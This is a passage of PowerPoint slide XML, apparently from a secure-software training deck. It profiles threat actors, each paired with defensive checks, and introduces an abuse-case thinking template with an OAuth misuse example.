        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="601219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EA12-ED29-4D07-132F-512AAF9F0709}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - Script  Kiddies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E45FAEE3-450B-F78A-20FA-B9A2BC9EC862}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6147278" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Kiddies are low-skilled, opportunistic hackers that exploit known CVEs &amp; default creds</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Traits: Copy/paste payloads, scan for known CVEs &amp; default creds.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Pressure test: Are we patched, parameterized, and hiding stack traces?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1900668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6D22-6199-934C-0356-3DF9D1923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2A06A-F1CE-913C-88D5-AC256B40626C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - Insiders</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B505D08-CB38-B81A-C1F0-E0547CEB26B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5847256" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Insiders</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> are company personnel – employees, contractors, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> –with access to the company's perimeter and assets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Traits: Knows where the bodies are buried, abuses over-broad permissions and access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Pressure test: Least privilege, just-in-time access, audit trails, break-glass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1812824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4B29F-041C-B04E-6D00-F8239CE0C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2B2CC-F3E0-E6AC-2EDF-DA05720B9898}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Hacktivists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B7537E2-2FB5-B234-C115-3B961ACB9F15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5663324" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A 'Hacktivist' is a cause-driven cyber activists that generally specialize in DoS, Defacement, or public data leaks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Traits: Persistence, public disclosures, social amplification</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Pressure test: Clear disclosure channels, fast patching, good defaults.</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14446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3FFAD-8C73-A951-5A0E-8F1A364F4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A4CBA-1BCB-9990-34C7-F238BC7937AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cyber Gangs/Criminals</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{046857AD-DAE6-D5F6-E676-6FB2E3BDC2F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7052582" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cyber Gangs/Criminals are profit-motivated attackers who steal/extort money or target valuable assets to sell on black markets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Traits: Initial access brokers, phishing, lateral movement, ransomware.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Pressure test: EDR, segmentation, off-path backups, secrets hygiene.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="713561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C859-F3F5-FF31-B04D-80D1F6B49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0CED3-D273-0BEE-5386-96AB2D012691}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Nation states / APTs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64AD3773-09A4-93D6-5A66-49B44343F6F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6355256" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>State-sponsored hackers, specialized in anti-terrorist and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>intelligence activities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Traits: Supply-chain compromise, living-off-the-land, zero-days, patience.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Pressure test: Assume compromise, harden build systems, attest artifacts, strong monitoring.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="121983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D3E9-3164-DBBE-3888-A1ADA0268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3B260-0268-CE70-68E0-97BFDB7378FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Thought Experiment</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1EDF9E4E-A4FD-F85B-BE00-F0F4B78020D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="4946936" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Which threat actor(s) present the most prevalent threat to your  organization, and why?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78359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BD008-9FEA-2141-1C97-06FB2BC88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7DF30-9E95-4307-8E9F-A76A0653043C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Abuse Case-Thinking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{939EE7D7-F5D4-CA9D-016A-5417185A292B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="4946936" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Abuse-case thinking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is the habit of designing and reviewing software by asking: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“How could a determined user (or attacker) intentionally misuse this feature to cause harm?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="298151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932C-3B6B-DC08-B4B7-5D7ECF19D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DC474-C3BE-D770-5587-ACBF95564573}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Abuse Case-Thinking Template</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDF82C14-BAD9-002A-F09A-E36E9C817581}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7075278" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“As a {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Threat Actor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>}, I want to {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>achieve goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>} against {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>asset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>} by abusing {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>system behavior</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>}, so I can {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>impact CIA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>}.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'As a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>rogue partner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, I want to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>pivot into core systems</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>third-party integrations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> by abusing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>over-trusted OAuth apps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, so I can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>steal proprietary data'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2398735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580A3-0D5A-53D4-FD68-1BF68422B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DB5E8-7D64-77CF-37FA-1108D96EEFA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Mini  Lab</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
